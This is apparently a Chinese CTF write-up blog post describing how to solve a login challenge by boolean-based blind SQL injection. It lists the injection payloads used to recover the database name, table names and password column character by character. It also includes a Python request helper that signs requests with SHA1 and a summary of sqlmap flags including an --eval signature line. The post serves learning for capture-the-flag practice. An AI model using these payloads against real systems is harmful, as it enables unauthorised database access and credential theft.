---
layout: post
title:  "布尔盲注的白给式利用"
date:   2019-05-29
desc: "苟利国家生死以,岂因祸福避趋之"
keywords: none
categories: [Blue-whale,Web]
tags: [sql,web]
icon: icon-html
---

# I Am Blind~~（我，星际玩家）~~

题目链接: [http://pwn1.blue-whale.me:23335/](http://pwn1.blue-whale.me:23335/)

这题目都把盲注两个字写脸上了

先`admin'#`试试

发现显示`success login, and flag is your password.`

得，一位一位试就完事了

## 手工注入或脚本注入

> 纯手工

- 库名获取

先把库名长度爆出来

```mysql
admin' and length(database()) = $长度
```

一个一个地试他娘的，试的时候直接对10二分了，还是挺快的

这里得到了库名长度

然后就需要一位一位地获取库名的字符

```mysql
admin' and substr(database(), $位置, 1) = $字符
```

二分比较快wdnmd

- 表名获取

~~我会告诉你库名实际上没什么用？~~

同理先把表名长度爆出来

```mysql
admin' and (select length(table_name) from information_schema.tables where table_schema = database() limit 0,1) = $长度#
```

同理

```mysql
admin' and substr((select table_name from information_schema.tables where table_schema = database() limit 0, 1), $位置, 1) = $字符#
```

- 字段名获取

盲猜`username`和`password`

试一试还真是

- flag获取

一位一位试就是了

```mysql
admin' and substr((select password from $表名 order by id limit 0, 1), $位置, 1) = $字符#
```

反正前五位`flag{`和最后一位`}`是固定的

> 脚本注入

什么你想要脚本？自己慢慢写吧

网上找的login函数

需要注意的是此处POST方法使用了`signature`来进行*sha1*校验，别的就没啥注意事项了

```python
def login(_username, _password):
    url = "http://pwn1.blue-whale.me:23335/index.php"
    data = {
        "username": _username,
        "password": _password,
        "signature": hashlib.sha1(_username + _password).hexdigest()
    }
    response = requests.post(url, data)
    content = response.content
    #print content
    if "success" in content:
        return True
    else:
        return False
```

## SQLMAP

> sqlmap用法

- -u 后接url，指定访问的地址

- \-\-data

  后面接参数表，用于POST方法

- \-\-eval

  设定由某个参数或多个参数决定的变量，如本题**signature**

```shell
--eval="import hashlib;signature=hashlib.sha1(username+password).hexdigest()"
```

- \-\-current-db

  获取当前数据库名

- \-\-tables

  获取数据表名

- \-\-columns

  获取字段名

- \-\-dump

  获取字段值

- -D

  设定数据库名

- -T

  设定数据表名

- -C

  设定字段名

**综上，此题白给**

